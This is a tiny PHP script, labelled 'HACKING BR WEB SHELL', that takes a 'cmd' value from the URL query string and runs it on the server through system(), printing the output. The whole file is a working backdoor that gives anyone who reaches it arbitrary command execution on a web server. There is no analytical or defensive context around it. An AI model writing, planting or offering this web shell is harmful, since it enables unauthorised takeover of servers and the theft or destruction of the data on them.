<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "HACKING BR WEB SHELL 
    <pre>";
    system($cmd);
    echo "</pre>";
}
?>
